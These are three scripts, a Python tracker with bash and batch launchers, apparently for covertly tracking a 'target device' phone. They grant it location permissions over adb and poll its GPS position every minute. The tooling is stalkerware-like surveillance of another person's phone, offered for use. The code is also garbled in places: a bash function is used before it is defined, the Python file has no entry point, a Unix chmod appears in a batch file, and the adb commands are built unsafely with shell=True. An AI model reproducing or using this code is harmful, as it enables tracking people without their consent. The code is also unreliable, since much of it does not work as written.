# location_tracker.py
import subprocess
import time
import webbrowser

def get_device_id(ip_address):
    # Get the device ID using adb
    cmd = f"adb devices | grep {ip_address} | awk '{{print $1}}'"
    device_id = subprocess.check_output(cmd, shell=True).decode().strip()
    return device_id

def grant_permissions(device_id):
    # Grant location and storage permissions using adb
    cmd = f"adb -s {device_id} shell pm grant com.android.providers.location android.permission.ACCESS_FINE_LOCATION"
    subprocess.call(cmd, shell=True)
    cmd = f"adb -s {device_id} shell pm grant com.android.providers.location android.permission.ACCESS_COARSE_LOCATION"
    subprocess.call(cmd, shell=True)
    cmd = f"adb -s {device_id} shell pm grant com.android.providers.location android.permission.ACCESS_BACKGROUND_LOCATION"
    subprocess.call(cmd, shell=True)

def get_location(device_id):
    # Get the current location using adb
    cmd = f"adb -s {device_id} shell dumpsys location"
    output = subprocess.check_output(cmd, shell=True).decode()

    # Parse the output to extract the latitude and longitude
    latitude = None
    longitude = None
    for line in output.splitlines():
        if "latitude=" in line:
            latitude = float(line.split("=")[1])
        elif "longitude=" in line:
            longitude = float(line.split("=")[1])

    # Check if the location was successfully retrieved
    if latitude is not None and longitude is not None:
        # Return the location as a tuple
        return (latitude, longitude)
    else:
        # Return None if the location could not be retrieved
        return None

def run_tracker(device_id):
    while True:
        # Get the current location
        location = get_location(device_id)

        if location:
            # Open Google Maps with the current location
            google_maps_url = f"https://www.google.com/maps/search/?api=1&query={location[0]},{location[1]}"
            webbrowser.open(google_maps_url)
        else:
            print("Could not retrieve the current location.")

        # Wait for a specified interval before checking again
        time.sleep(60)  # Wait for 60 seconds (1 minute) before checking again

# auto_run.sh
#!/bin/bash

# Install pip
sudo apt-get install python3-pip

# Install the required dependencies
pip3 install android

# Download the script
wget https://raw.githubusercontent.com/your-repo/location_tracker.py

# Grant permissions to the script
chmod +x location_tracker.py

# Prompt for the target device IP address
read -p "Enter the IP address of the target device: " ip_address

# Get the device ID
device_id=$(adb devices | grep $ip_address | awk '{print $1}')

# Grant permissions to the target device
grant_permissions $device_id

# Run the script
python3 location_tracker.py $device_id

# Function to grant permissions
grant_permissions() {
    adb -s $1 shell pm grant com.android.providers.location android.permission.ACCESS_FINE_LOCATION
    adb -s $1 shell pm grant com.android.providers.location android.permission.ACCESS_COARSE_LOCATION
    adb -s $1 shell pm grant com.android.providers.location android.permission.ACCESS_BACKGROUND_LOCATION
}

# auto_run.bat
@echo off

:: Install the required dependencies
pip3 install android

:: Download the script
wget https://raw.githubusercontent.com/your-repo/location_tracker.py

:: Grant permissions to the script
chmod +x location_tracker.py

:: Prompt for the target device IP address
set /p ip_address="Enter the IP address of the target device: "

:: Get the device ID
for /f "tokens=1" %%i in ('adb devices ^| findstr %ip_address%') do set device_id=%%i

:: Grant permissions to the target device
call :grant_permissions %device_id%

:: Run the script
python3 location_tracker.py %device_id%

:: Function to grant permissions
:grant_permissions
    adb -s %1 shell pm grant com.android.providers.location android.permission.ACCESS_FINE_LOCATION
    adb -s %1 shell pm grant com.android.providers.location android.permission.ACCESS_COARSE_LOCATION
    adb -s %1 shell pm grant com.android.providers.location android.permission.ACCESS_BACKGROUND_LOCATION
    goto :eof